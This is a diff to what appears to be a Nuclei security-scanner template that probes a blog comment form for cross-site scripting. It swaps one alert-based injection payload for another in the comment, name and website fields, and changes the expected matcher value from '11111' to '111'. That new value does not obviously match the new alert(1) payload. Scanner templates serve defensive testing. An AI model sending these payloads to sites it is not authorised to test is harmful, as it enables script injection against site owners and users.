@@ -21,7 +21,7 @@ requests:
       Host: {{Hostname}}
       Content-Type: application/x-www-form-urlencoded
       
-      csrf={{csrf}}&postId=1&comment=DEMO_nuclei&name=DEMO_nuclei&email=demo%40fir.uiii&website=http://foo.bar&apos;);alert(11111);//
+      csrf={{csrf}}&postId=1&comment=http://foo?&apos;-alert(1)-&apos;//&name=http://foo?&apos;-alert(1)-&apos;//&email=demo%40fir.uiii&website=http://foo?&apos;-alert(1)-&apos;//
 
     redirects: true
     cookie-reuse: true      
@@ -48,5 +48,5 @@ headless:
       - type: dsl
         dsl:
           - reflected_topicId_query == true
-          - reflected_topicId_query_message == "11111" # 3+4
+          - reflected_topicId_query_message == "111" # 3+4
         condition: and
